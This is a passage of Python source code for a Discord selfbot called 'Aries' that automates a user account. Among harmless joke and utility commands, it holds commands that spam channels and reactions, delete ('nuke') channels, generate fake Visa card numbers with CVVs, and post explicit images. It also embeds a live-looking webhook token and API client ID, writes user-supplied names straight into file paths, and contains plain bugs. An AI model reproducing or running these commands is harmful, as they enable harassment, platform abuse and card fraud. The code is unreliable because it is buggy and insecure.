    embed = discord.Embed(title= "Aries Pickup line", description = random.choice(pickuplines), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def joke(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    jokes = ["Why did the orange lose the race? It ran out of juice.", "How you fix a broken pumpkin? With a pumpkin patch", "What's the best thing about Switzerland? I don't know, but the flag is a big plus.", "Why do peppers make such good archers? Because they habanero.", "What did the sink tell the toilet? You look flushed!", "Can February March? No, but April May!Can February March? No, but April May!", "I hated facial hair but then it grew on me.", ]
    embed = discord.Embed(title= "Aries The Comedian", description = random.choice(jokes), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def headers(ctx, website):
    ctx.message.delete()
    r = requests.get(website, allow_redirects=True)
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Headers", description = f"Headers: {r.headers}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed) 
@bot.command()
async def rickroll(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Just Ricked YOU!", description = "https://www.youtube.com/watch?v=dQw4w9WgXcQ", color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/758834492931833938/894667218875461652/unknown.png")
    embed.set_image(url = "https://media.giphy.com/media/Ju7l5y9osyymQ/giphy.gif")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed) 
@bot.command()
async def ariesinvite(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Invite", description = "https://www.youtube.com/watch?v=dQw4w9WgXcQ", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed) 
@bot.command()
async def cn(ctx, name, contents):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    ISDIR = os.path.isdir("./data/notes/")
    if not ISDIR:
        os.mkdir("./data/notes")
    with open("./data/notes/" + name + ".json", "w") as f:
        f.write(json.dumps(str(contents), indent=4))

    embed = discord.Embed(title= "Aries Notification", description = "Made Note with Contents: " + contents, color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def en(ctx, notename, newcontent):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    ISDIR = os.path.exists("./data/notes/" + notename + ".json")
    ISDIR2 = os.path.isdir("./data/notes")
    if not ISDIR2:
        os.mkdir("./data/notes")
    if ISDIR:
     with open("./data/notes/" + notename + ".json", "w") as f:
        f.write(json.dumps(str(newcontent), indent=4))
     embed = discord.Embed(title= "Aries Notification", description = "Edited " + notename + " with Contents: " + newcontent, color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt")
     await ctx.send(embed = embed)
    else:
     embed = discord.Embed(title= "Aries Notification", description = "No note found with the name: " + notename, color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt")
     await ctx.send(embed = embed)
@bot.command()
async def leave(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    guild = ctx.guild
    print(Fore.CYAN + "Info" + Fore.RESET + " | " + Fore.LIGHTCYAN_EX + "[!] " + Fore.CYAN + "Left Server » " + Fore.LIGHTCYAN_EX + str(guild))
    await asyncio.sleep(1)
    await guild.leave()
@bot.command()
async def hentai(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    hentai = ["https://i.redd.it/f7bvxozp9kb61.png", "https://i.redd.it/okplmg1aq7961.png", "https://preview.redd.it/olv12c8bze271.png?auto=webp&s=045669166e29212f8724a54bc22d72cca7822ef8", "https://i.redd.it/y5uy7ipxmej41.jpg", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTImivRmr0qEeXzHNFRdQRuHTAYLSBUJqvydQ&usqp=CAU"]
    embed = discord.Embed(title= "", description = "", color=readableHex)
    embed.set_image(url = random.choice(hentai))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def fakenitro(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    await ctx.send("https://cdn.discordapp.com/attachments/769698485527248907/895897569589346314/unknown.png")
@bot.command()
async def checkprefix(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Prefix", description = f"{prefix_config}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def ln(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    onlyfiles = [f for f in listdir("./Data/Notes")]
    file = str(onlyfiles)
    file2 = file.replace(".json", "")
    embed = discord.Embed(title= "Aries Notification", description = str(file2.replace("'", "")), color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif%22")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def setdet(ctx, val):
    await ctx.message.delete()
    global afkmode
    global fake_nitro
    args1 = str(val)
    args2 = args1.replace("T", "t")
    data = {
        "token": f"{token_config}",
        "prefix": f"{prefix_config}",
        "sniper": f"{nitro_sniper_config}",
        "detector": f"{args2}",
        "theme": f"{theme_config}",
        "AFK": f"{afkmode_config}",
        "AFK-Message": f"{afkmsg_config}",
        "Fake-Nitro": f"{fake_nitro_config}"
    }
    with open(f"./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Sniper", description = "Set SB Detection To: " + str(args2), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)  
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def selfbotdetector(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Selfbot Detection", description = f"{selfbot_detector_config}", color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif%22")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def nick(ctx, member: discord.Member, nick):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    await member.nick(nick = nick)
    embed = discord.Embed(title= "Aries Notifcation", description = "Set Nick To: " + nick, color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif%22")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def spam(ctx, delay: int, count, *, message):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    for i in range(int(count)):
        await ctx.send(message)
        await asyncio.sleep(delay)
@bot.command()
async def time(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    now = dt.now()
    current_time = now.strftime("%H:%M:%S")
    embed = discord.Embed(title= "Aries Notifcation", description = "Current time: " + current_time, color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def date(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    today = dt.today().strftime('%Y-%m-%d')
    embed = discord.Embed(title= "Aries Notifcation", description = "Current Date: " + today, color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def server(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    memcount = len([m for m in ctx.guild.members if not m.bot]) # doesn't include bots
    embed = discord.Embed(title= "Aries Info on: " + str(guild), description = "Server has: " + str(memcount) + " Members" , color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def invite(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    guild = ctx.guild
    link = await ctx.channel.create_invite(max_age = 300)
    embed = discord.Embed(title= "Aries Invite for " + str(guild), description = "Invite: " + str(link) , color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def nuke(ctx):
    await ctx.channel.delete()
    channel = await ctx.channel.clone()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries", description = f"Successfully Nuked {channel}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await channel.send(embed = embed)
@bot.command()
async def meme(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    memes = ["https://i.redd.it/5mstqjaymuf41.jpg", "https://img.buzzfeed.com/buzzfeed-static/static/2021-01/28/19/campaign_images/93697a775252/just-a-bunch-of-good-memes-about-how-reddit-succe-2-1453-1611863916-11_dblbig.jpg?resize=1200:*", "https://preview.redd.it/do5c7wed6r861.png?auto=webp&s=73605a17e8c4d4f3854e5fdd46a8fe4a09a118e9", "https://preview.redd.it/do5c7wed6r861.png?auto=webp&s=73605a17e8c4d4f3854e5fdd46a8fe4a09a118e9", "https://pbs.twimg.com/media/D77OV5DXYAAxbP-.png", "https://i.redd.it/jw2ewoutld331.jpg", "https://cdn.vox-cdn.com/thumbor/DgjQ7atpTIT4bCa176C0NdaN7r8=/1400x788/filters:format(png)/cdn.vox-cdn.com/uploads/chorus_asset/file/13751928/Screen_Shot_2019_02_11_at_11.40.05_AM.png"]
    embed = discord.Embed(title= "Aries Meme", description = "Take a Meme!", color=readableHex)
    embed.set_image(url = str(random.choice(memes)))
    embed.set_footer(text = "made with ♡ by bomt")
    embed.set_thumbnail(url = config.get('imageurl'))
    await ctx.send(embed = embed)
@bot.command()
async def ghostping(ctx, user: discord.User):
    await ctx.message.delete()
@bot.command()
async def genpass(ctx, length):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    result_str = ''.join(random.choice(string.ascii_letters + "12345678910/;':[']|") for i in range(int(length)))
    embed = discord.Embed(title= "Aries Password Generator", description = result_str, color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def sendnoti(ctx, title, message):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    notif = ToastNotifier()
    notif.show_toast(title, message, icon_path="assets/ariesnobg.ico", duration=10)
    embed = discord.Embed(title= "Aries Notifcation ", description = "Sent Noti!", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def pussy(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    pussy = ["https://i.redd.it/xhwxmqgtnkq51.jpg", "https://i.redd.it/r216hpdlzd171.jpg", "https://preview.redd.it/f62vvitj2og61.jpg?auto=webp&s=a8ab4ae4e4c4bc86b5b21f9967058f09ddddb28c"]
    embed = discord.Embed(title= "", description = "", color=readableHex)
    embed.set_image(url = str(random.choice(pussy)))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def hentaigif(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    gifs = ["https://25.media.tumblr.com/tumblr_m1v7mdNnzg1r6wwpso1_400.gif", "https://i.redd.it/h6oi753u0ts41.gif"]
    embed = discord.Embed(title= "", description = "", color=readableHex)
    embed.set_image(url = str(random.choice(gifs)))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def uploadimage(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    for attachment in ctx.message.attachments:
        # Download Image to file location
        await attachment.save(attachment.filename)

    CLIENT_ID = "26961e77de57def"
    im = pyimgur.Imgur(CLIENT_ID)
    attachment_url = ctx.message.attachments[0].filename
    #Upload image where it downloads it
    uploaded_image = im.upload_image(str(os.getcwd() + "/" + attachment_url), title="Uploaded with Aries")
    uploaded = "true"
    #Print Image
    embed = discord.Embed(title= "Aries Imgur", description = "Uploaded: " + str(uploaded_image.link), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    if (uploaded == "true"):
     
     os.remove((str(os.getcwd() + "/" + attachment_url)))
     uploaded = "false"
    await ctx.send(embed = embed)
@bot.command()
async def afkmessage(ctx, *, message):
    await ctx.message.delete()
    data = {
        "token": f"{token_config}",
        "prefix": f"{prefix_config}",
        "sniper": f"{nitro_sniper_config}",
        "detector": f"{selfbot_detector_config}",
        "theme": f"{theme_config}",
        "AFK": f"{afkmode_config}",
        "AFK-Message": f"{message}",
        "Fake-Nitro": f"{fake_nitro_config}"
    }
    with open("./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries AFK", description = f"Set AFK Message To: {message}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def copycat(ctx, user: discord.User, value: bool):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    global copier
    copier = value
    global person
    person = user.name
    embed = discord.Embed(title= "Aries Copycat", description = "Now Copying: " + str(person) + " Set Copier to: " + str(copier), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def spamreact(ctx, id):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    msg = await ctx.fetch_message(id)
    await msg.add_reaction('\N{THUMBS UP SIGN}')
    await msg.add_reaction('\N{THUMBS DOWN SIGN}')
    await msg.add_reaction('❤️')
    await msg.add_reaction('😳')
    await msg.add_reaction('😍')
    await msg.add_reaction('😠')
    await msg.add_reaction('😈')
    await msg.add_reaction('😔')
    await msg.add_reaction('💀')
    await msg.add_reaction('👑')
    await msg.add_reaction('🍴')
    await msg.add_reaction('🍉')
    await msg.add_reaction('💯')
    await msg.add_reaction('🥺')
    await msg.add_reaction('😍')
    await msg.add_reaction('🥵')
    await msg.add_reaction('🧠')
    await msg.add_reaction('🤔')
    await msg.add_reaction('🙄')
    await msg.add_reaction('🙌')
    await msg.add_reaction('☠️')
@bot.command()
async def genusername(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    chars = "abcdefghijklmnopqrstuvwxyz"
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    username = '{}{}{}'.format(random.choice(chars), random.choice(chars)[-1][:3].rjust(3, random.choice(chars)), '{:03d}'.format(random.randrange (1,999)))
    embed = discord.Embed(title= config.get('title'), description = f"Username: {str(username)}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)   
@bot.command()
async def poll(ctx, *, question):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = f"{question}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    msg = await ctx.send(embed = embed)   
    await msg.add_reaction('\N{THUMBS UP SIGN}')
    await msg.add_reaction('\N{THUMBS DOWN SIGN}')
@bot.command()
async def setsniper(ctx, value):
    await ctx.message.delete()
    global afkmode
    args1 = str(value)
    args2 = args1.replace("T", "t")
    data = {
        "token": f"{token_config}",
        "prefix": f"{prefix_config}",
        "sniper": f"{args2}",
        "detector": f"{selfbot_detector_config}",
        "theme": f"{theme_config}",
        "AFK": f"{afkmode_config}",
        "AFK-Message": f"{afkmsg_config}",
        "Fake-Nitro": f"{fake_nitro_config}"
    }
    with open(f"./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Sniper", description = "Sniper is: " + str(args2), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)  
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def crypto(ctx):
    #TODO Add More Cryptos
    url = "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd%2Ceur%2Cgbp"
    url2 = "https://api.coingecko.com/api/v3/simple/price?ids=dogecoin&vs_currencies=usd%2Ceur%2Cgbp"
    r = requests.get(url)
    r2= requests.get(url2)
    rToJson = r.json()
    r2ToJson = r2.json()

    btcUSD = rToJson["bitcoin"]["usd"]
    btcEUR = rToJson["bitcoin"]["eur"]
    btcGBP = rToJson["bitcoin"]["gbp"]
    dogeUSD = r2ToJson["dogecoin"]["usd"]
    dogeEUR = r2ToJson["dogecoin"]["eur"]
    dogeGBP = r2ToJson["dogecoin"]["gbp"]
    print(rToJson)
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    
    embed = discord.Embed(title= "Aries Crypto", description = f"Bitcoin: USD: {btcUSD} - EUR: {btcEUR} - GPB: {btcGBP}\nDogecoin: USD: {dogeUSD} - EUR: {dogeEUR} - GBP: {dogeGBP}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def settheme(ctx, theme1):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    global theme
    global afkmode
    global afkmsg
    theme = theme1
    data = {
        "token": f"{token}",
        "prefix": f"{prefix_config}",
        "sniper": f"{nitro_sniper_config}",
        "detector": f"{selfbot_detector_config}",
        "theme": f"{theme1}",
        "AFK": f"{afkmode_config}",
        "AFK-Message": f"{afkmsg_config}",
        "Fake-Nitro": f"{fake_nitro_config}"
    }
    with open("./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    embed = discord.Embed(title= "Aries Theme", description = "Theme is: " + theme1, color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def uploadtheme(ctx, themename):
    await ctx.message.delete()
    try:
        webhook = discord.Webhook.partial(900202510726332426, 'hzY_ELOwg1emz_xbpZvTtpv6Ee0NbPyy9yb7qpuumirnqovsRbk_asYPz6YbK1eaSWjb', adapter=discord.RequestsWebhookAdapter()) # Your webhook
        with open(file=f'./data/themes/{themename}' + ".json", mode='rb') as f:
         my_file = discord.File(f)
        webhook.send(f'Theme Name: {themename}', username='Themes', file=my_file)
    except Exception as e:
        pass
@bot.command()
async def edittheme(ctx, name, newtitle, newimage, newcolor, newtcolor):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    data = {
        "title": f"{newtitle}",
        "imageurl": f"{newimage}",
        "color": f"{newcolor}",
        "TColor": f"{newtcolor}"
    }
    with open(f"./data/themes/{name}.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    embed = discord.Embed(title= "Aries Theme", description = f"Edited theme: {name}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def fakecreditcard(ctx):
    await ctx.message.delete()
    def generate():
        key = ''
        portion = ''
        characters = '123456789'

        while True:
            while len(key) < 20:
                character = "" + random.choice(characters) # pick a random character from the string above and ...
                key += character # append to th key
                portion += character

                if len(portion) == 4:
                    key += ' ' # add a hyphen after every 4 characters to get the aaaa-bbbb-cccc-dddd-3333 format
                    portion = ''
            key = key[:-1]
            card = re.sub(r'.', '', key, count = 1)
            return "4" + card
    def gencw():
        key = ''
        portion = ''
        characters = '123456789'

        while True:
            while len(key) < 3:
                character = "4" + random.choice(characters) # pick a random character from the string above and ...
                key += character # append to th key
                portion += character
            key = key[:-1]
            return key       
    with open(f"./data/themes/{theme_config}.json") as f: 
        config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    credNUmber = generate()
    cw = gencw()
    embed = discord.Embed(title= config.get('title'), description = f"Fake Number: {credNUmber} CW: {cw}\nType: VISA\nExpiration: 02/22", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)

@bot.command()
async def installtheme(ctx, name):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    data = ""
    if name == "Midnight":
     data = {
    "title": "Midnight",
    "imageurl": "https://cdn.discordapp.com/attachments/769698485527248907/900160094287843338/mystical-midnight-sky-with-stars-surrounded-by-dramatic-clouds-dark-picture-id1133588496.png",
    "color": "#191970",
    "TColor": "Cyan"
       }
    else:
        if name == "ShootingStar":
         data = {
        "title": "Shooting Star",
        "imageurl": "https://cdn.discordapp.com/attachments/769698485527248907/900205216580907038/a2a66b1b23b23791e5d73a00b9325d04.gif",
        "color": "#191970",
        "TColor": "Cyan"
       }
    with open(f"./data/themes/{name}.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    embed = discord.Embed(title= "Aries Theme", description = f"Installed theme: {name}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def createtheme(ctx, title, imageurl, color, tcolor):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    data = {
        "title": f"{title}",
        "imageurl": f"{imageurl}",
        "color": f"{color}",
        "TColor": f"{tcolor}"
    }
    with open(f"./data/themes/{name}.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    embed = discord.Embed(title= "Aries Theme", description = f"Made theme: {name}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def NitroSound(ctx, value):
    await ctx.message.delete()
    global NitroSound
    if (value == "false" or "False"):
        NitroSound = False
    elif (value == "True" or "true"):
        NitroSound = True
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    
